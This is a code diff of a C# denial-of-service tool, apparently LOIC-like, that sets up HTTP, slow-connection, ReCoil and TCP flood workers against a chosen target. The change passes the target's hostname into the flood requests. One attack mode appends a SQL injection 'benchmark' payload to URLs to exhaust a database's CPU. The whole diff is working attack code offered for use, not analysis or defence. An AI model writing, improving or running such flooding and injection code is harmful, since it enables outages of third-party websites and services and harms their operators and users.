@@ -22,7 +22,7 @@ namespace GAS.Core
             public AttackMethod Method;
             public IPAddress Target = locolhaust;
             public bool WaitForResponse = false, AppendRANDOMChars = false, AppendRANDOMCharsUrl=false, UseGZIP = false, USEGet = false;
-            public string Subsite = "/";
+            public string Subsite = "/", DNSString=locolhaust.ToString();
         #endregion
         static IPAddress locolhaust = IPAddress.Parse("127.0.0.1");
         public IAttacker Worker;
@@ -39,6 +39,7 @@ namespace GAS.Core
                     if (!host.StartsWith("http://") && !host.StartsWith("https://")) host = String.Concat("http://", host);
                     var trg =new Uri(host);
                     Target = Dns.GetHostEntry(trg.Host).AddressList[0];
+                    DNSString = trg.Host;
                     Subsite=trg.PathAndQuery;
                     return true;
                 }
@@ -60,13 +61,13 @@ namespace GAS.Core
             switch (Method)
             {
                 case AttackMethod.HTTP:
-                    Worker = new HTTPFlooder(Target.ToString(), Target.ToString(), Port, Subsite, WaitForResponse, Delay, Timeout, AppendRANDOMChars || AppendRANDOMCharsUrl, UseGZIP, Threads);
+                    Worker = new HTTPFlooder(DNSString, Target.ToString(), Port, Subsite, WaitForResponse, Delay, Timeout, AppendRANDOMChars || AppendRANDOMCharsUrl, UseGZIP, Threads);
                     break;
                 case AttackMethod.ReCoil:
-                    Worker = new ReCoil(Target.ToString(), Target.ToString(), Port, Subsite, Delay, Timeout, AppendRANDOMChars || AppendRANDOMCharsUrl, WaitForResponse, SPT, UseGZIP, Threads);
+                    Worker = new ReCoil(DNSString, Target.ToString(), Port, Subsite, Delay, Timeout, AppendRANDOMChars || AppendRANDOMCharsUrl, WaitForResponse, SPT, UseGZIP, Threads);
                     break;
                 case AttackMethod.SlowLOIC:
-                    Worker=new SlowLoic(Target.ToString(), Target.ToString(), Port, Subsite, Delay, Timeout, AppendRANDOMChars || AppendRANDOMCharsUrl, SPT, AppendRANDOMCharsUrl,USEGet, UseGZIP, Threads);
+                    Worker = new SlowLoic(DNSString, Target.ToString(), Port, Subsite, Delay, Timeout, AppendRANDOMChars || AppendRANDOMCharsUrl, SPT, AppendRANDOMCharsUrl, USEGet, UseGZIP, Threads);
                     break;
                 case AttackMethod.TCP:
                     Worker = new PacketFlood(Target.ToString(), Port, 1, Delay, WaitForResponse, Data, AppendRANDOMChars, Threads);
@@ -76,7 +77,7 @@ namespace GAS.Core
                     break;
                 case AttackMethod.RefRef:
                     this.Subsite += " and (select+benchmark(99999999999,0x70726f62616e646f70726f62616e646f70726f62616e646f))";
-                    Worker = new HTTPFlooder(Target.ToString(), Target.ToString(), Port, Subsite, WaitForResponse, Delay, Timeout, AppendRANDOMChars || AppendRANDOMCharsUrl, UseGZIP, Threads);
+                    Worker = new HTTPFlooder(DNSString, Target.ToString(), Port, Subsite, WaitForResponse, Delay, Timeout, AppendRANDOMChars || AppendRANDOMCharsUrl, UseGZIP, Threads);
                     break;
             }
             Worker.Start();
